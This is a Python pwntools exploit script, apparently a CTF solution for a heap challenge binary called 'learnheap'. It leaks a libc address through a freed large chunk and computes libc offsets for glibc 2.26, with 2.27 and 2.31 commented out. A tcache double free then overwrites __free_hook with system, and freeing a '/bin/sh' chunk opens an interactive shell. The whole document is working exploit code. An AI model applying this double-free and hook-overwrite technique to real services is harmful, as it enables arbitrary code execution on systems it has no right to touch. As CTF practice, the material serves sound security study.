from pwn import *

context.log_level='debug'
# io = process(['./ld-2.27.so', './learnheap'], env={'LD_PRELOAD': './libc-2.27.so'})
# io = process(['./ld-2.26.so', './learnheap'], env={'LD_PRELOAD': './libc-2.26.so'})
# io = process(['./ld-2.31.so', './learnheap'], env={'LD_PRELOAD': './libc-2.31.so'})
io = remote('0.0.0.0', 1234)

def add(idx, size, content):
    io.sendlineafter('id> ', str(idx))
    io.sendlineafter('size> ', str(size))
    io.sendlineafter('content> ', str(content))
    
def free(idx):
    io.sendlineafter('id> ', str(idx))

# gdb.attach(io)
add(0, 0x420, '0')
add(1, 0x20, '0')
free(0)
# io.recv()
add(2, 0x20, '')
# gdb.attach(io)
io.recvuntil('Your book: \n')

# main_arena = u64(io.recv(6).ljust(8,'\x00')) - 970 # 2.27
main_arena = u64(io.recv(6).ljust(8,'\x00')) - 1002 # 2.26
# main_arena = u64(io.recv(6).ljust(8,'\x00')) - 906 # 2.31
log.success('main_arena:'+hex(main_arena))

# libc_base = main_arena - 0x3ebc40 # 2.27
libc_base = main_arena - 0x3dac20 # 2.26
# libc_base = main_arena - 0x1ecb80  # 2.31
log.success('libc_base:'+hex(libc_base))

# libc = ELF('./libc-2.27.so')
libc = ELF('./libc-2.26.so')
# libc = ELF('./libc-2.31.so')

system_addr = libc_base + libc.sym['system']
log.success('system_addr:'+hex(system_addr))

io.sendlineafter("Let's make a test.", hex(system_addr))

# gdb.attach(io)
# add(3, 0x20, 'a')
free(1)
free(2)
free(1)
# free(2)

io.sendlineafter("Ok~,Let's make a test again.", str(0x20))

hook = libc.sym['__free_hook'] + libc_base
log.success('hook:'+hex(hook))
add(3, 0x20, p64(hook))
add(4, 0x20, '/bin/sh\x00')
add(5, 0x20, 'a')
# log.success(hex(libc.sym['__free_hook']))
add(6, 0x20, p64(system_addr))

free(4)

def add(idx, size, content):
    io.sendlineafter('> ', str(1))
    io.sendlineafter('id> ', str(idx))
    io.sendlineafter('size> ', str(size))
    io.sendlineafter('content> ', str(content))
    
def free(idx):
    io.sendlineafter('> ', str(3))
    io.sendlineafter('id> ', str(idx))

add(0, 0x20, 'a')
add(1, 0x20, 'a')
free(0)
free(1)
free(0)
add(3, 0x20, p64(hook))
add(4, 0x20, '/bin/sh\x00')
add(5, 0x20, 'a')
add(6, 0x20, p64(system_addr))
free(4)
# gdb.attach(io)
io.interactive()